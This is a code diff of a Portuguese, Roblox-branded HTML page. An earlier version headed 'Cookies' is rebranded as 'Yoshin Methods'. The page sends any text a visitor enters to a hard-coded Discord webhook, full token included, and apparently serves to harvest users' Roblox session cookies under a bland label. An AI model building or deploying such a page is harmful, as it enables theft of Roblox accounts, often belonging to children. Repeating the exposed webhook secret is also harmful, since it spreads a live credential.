@@ -1,199 +1,209 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>yoshin metods</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Yoshin Methods</title>
 
-    <style>
-        /* -------- FUNDO PRETO + LOGO ROBLOX -------- */
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: "Arial", sans-serif;
-            background: #000000;
-            color: white;
-            overflow-x: hidden;
-        }
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #000;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        color: white;
+    }
 
-        .logo-bg {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            width: 600px;
-            height: 600px;
-            background: url('https://upload.wikimedia.org/wikipedia/commons/0/0a/Roblox_Logo_2022.svg') no-repeat center;
-            background-size: contain;
-            opacity: 0.06;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            filter: drop-shadow(0 0 25px red);
-        }
+    /* Fundo com ondas suaves */
+    .waves {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(circle at center, #111 0%, #000 80%);
+        overflow: hidden;
+        z-index: -1;
+    }
 
-        /* -------- CONTAINER -------- */
-        .container {
-            position: relative;
-            width: 480px;
-            margin: 140px auto;
-            background: #0c0c0c;
-            padding: 35px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 0 35px #ff000055;
-            border: 2px solid #ff0000bb;
-            animation: fadeIn 1s ease forwards;
-        }
+    .wave {
+        position: absolute;
+        width: 200%;
+        height: 200%;
+        top: -50%;
+        left: -50%;
+        background: rgba(255, 0, 0, 0.06);
+        border-radius: 45%;
+        animation: waveMove 9s infinite linear;
+    }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(25px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
+    .wave:nth-child(2) {
+        animation-duration: 13s;
+        background: rgba(255, 0, 0, 0.03);
+    }
 
-        /* -------- TEXTO 3D / NEON -------- */
-        h1 {
-            font-size: 38px;
-            margin-bottom: 10px;
-            color: #ff1c1c;
-            letter-spacing: 2px;
-            text-shadow:
-                0 0 10px red,
-                0 0 20px red,
-                0 0 40px #ff0000,
-                0 0 70px #ff0000,
-                2px 2px 0px #5c0000; /* efeito 3D */
-        }
+    @keyframes waveMove {
+        0% { transform: rotate(0deg) scale(1); }
+        100% { transform: rotate(360deg) scale(1.4); }
+    }
 
-        /* -------- INPUT -------- */
-        input {
-            width: 90%;
-            padding: 14px;
-            margin-top: 25px;
-            border-radius: 10px;
-            border: 2px solid #ff0000bb;
-            background: #1a1a1a;
-            color: white;
-            font-size: 17px;
-            outline: none;
-            transition: 0.3s;
-        }
+    /* LOGO ROBLOX */
+    .logo {
+        width: 160px;
+        opacity: 0.25;
+        position: absolute;
+        top: 40px;
+        left: 50%;
+        transform: translateX(-50%);
+    }
 
-        input:focus {
-            box-shadow: 0 0 18px red;
-            border-color: #ff2b2b;
-        }
+    /* Caixa principal */
+    .box {
+        width: 450px;
+        margin: 180px auto 0 auto;
+        background: #0a0a0a;
+        padding: 30px;
+        border-radius: 20px;
+        text-align: center;
+        border: 2px solid #550000;
+        box-shadow: 0 0 20px #ff00001c;
+    }
 
-        /* -------- BOTÃO NEON -------- */
-        button {
-            margin-top: 30px;
-            padding: 15px 55px;
-            background: #ff0000;
-            border: none;
-            border-radius: 14px;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 
-                0 0 20px #ff000099,
-                0 0 40px #ff000066;
-            animation: pulse 2.5s infinite linear;
-        }
+    /* Título com neon suave */
+    h1 {
+        font-size: 34px;
+        font-weight: bold;
+        color: #c30000;
+        text-shadow:
+            0 0 4px #300000,
+            0 0 6px #200000,
+            1px 1px 0px #2a0000;
+    }
 
-        @keyframes pulse {
-            0% { box-shadow: 0 0 15px #ff000099; }
-            50% { box-shadow: 0 0 35px #ff0000cc; }
-            100% { box-shadow: 0 0 15px #ff000099; }
-        }
+    /* Input */
+    input {
+        width: 90%;
+        padding: 12px;
+        border-radius: 10px;
+        background: #1d1d1d;
+        border: 1px solid #550000;
+        color: white;
+        margin-top: 20px;
+        font-size: 16px;
+        outline: none;
+    }
 
-        button:hover {
-            background: #d10000;
-            transform: scale(1.06);
-        }
+    /* Botão */
+    button {
+        margin-top: 20px;
+        padding: 12px 40px;
+        font-size: 18px;
+        background: #b30000;
+        border: none;
+        border-radius: 10px;
+        color: white;
+        cursor: pointer;
+        box-shadow: 0 0 10px #ff000055;
+        transition: .3s;
+    }
 
-        /* -------- TELA DE CARREGAMENTO -------- */
-        #loadingScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000000f8;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
-            font-size: 28px;
-            animation: fadeInLoad 0.5s ease;
-        }
+    button:hover {
+        background: #8f0000;
+        transform: scale(1.05);
+    }
 
-        @keyframes fadeInLoad {
-            from { opacity: 0; }
-            to   { opacity: 1; }
-        }
+    /* Tela de carregamento */
+    #loading {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #000000e5;
+        backdrop-filter: blur(3px);
+        color: white;
+        font-size: 26px;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
 
-        .loader {
-            width: 380px;
-            height: 22px;
-            background: #1a1a1a;
-            border-radius: 14px;
-            margin-top: 20px;
-            overflow: hidden;
-            border: 2px solid red;
-        }
+    .loader {
+        width: 260px;
+        height: 18px;
+        background: #1a1a1a;
+        border-radius: 10px;
+        margin-top: 20px;
+        border: 2px solid red;
+        overflow: hidden;
+    }
 
-        .loader-bar {
-            height: 100%;
-            width: 40%;
-            background: red;
-            animation: loading 1s infinite linear;
-        }
+    .loader-bar {
+        height: 100%;
+        width: 40%;
+        background: red;
+        animation: load 1s infinite linear;
+    }
 
-        @keyframes loading {
-            0% { margin-left: -40%; }
-            100% { margin-left: 100%; }
-        }
-    </style>
+    @keyframes load {
+        0% { margin-left: -40%; }
+        100% { margin-left: 100%; }
+    }
+</style>
 </head>
+
 <body>
 
-    <!-- LOGO GRANDE DE FUNDO -->
-    <div class="logo-bg"></div>
-
-    <div class="container">
-        <h1>Cookies</h1>
-        <p>Digite qualquer texto:</p>
-
-        <input id="textoInput" type="text" placeholder="Escreva algo...">
-        <button onclick="enviarTexto()">Enviar</button>
+    <!-- Fundo -->
+    <div class="waves">
+        <div class="wave"></div>
+        <div class="wave"></div>
     </div>
 
-    <!-- TELA DE CARREGAMENTO -->
-    <div id="loadingScreen">
-        <div>Carregando...</div>
+    <!-- Logo -->
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_Black.svg">
+
+    <!-- Conteúdo -->
+    <div class="box">
+        <h1>Yoshin Methods</h1>
+        <p>Digite algo abaixo:</p>
+        <input id="texto" type="text" placeholder="Escreva qualquer coisa...">
+        <button onclick="enviar()">Enviar</button>
+    </div>
+
+    <!-- Tela de carregamento -->
+    <div id="loading">
+        Enviando...
         <div class="loader"><div class="loader-bar"></div></div>
     </div>
 
-    <script>
-        function enviarTexto() {
-            const texto = document.getElementById("textoInput").value.trim();
+<script>
+function enviar() {
+    let txt = document.getElementById("texto").value;
 
-            if (texto === "") {
-                alert("Digite alguma coisa antes de enviar!");
-                return;
-            }
+    if (txt.trim() === "") {
+        alert("Digite algo primeiro.");
+        return;
+    }
 
-            document.getElementById("loadingScreen").style.display = "flex";
+    document.getElementById("loading").style.display = "flex";
 
-            fetch("SEU_WEBHOOK_AQUI", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "📩 **Nova mensagem enviada:**\n" + texto
-                })
-            });
-        }
-    </script>
+    fetch("https://discord.com/api/webhooks/1440869478354124912/UeJLq2EsBNa7F7qmZlzeWASC9ePkHsRp6aq4Ca8UB0pevj60dfnW9ksXKoDa-RdQwgLw", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "📩 **Novo texto enviado:**\n" + txt
+        })
+    });
+
+    setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("texto").value = "";
+    }, 2000);
+}
+</script>
 
 </body>
 </html>
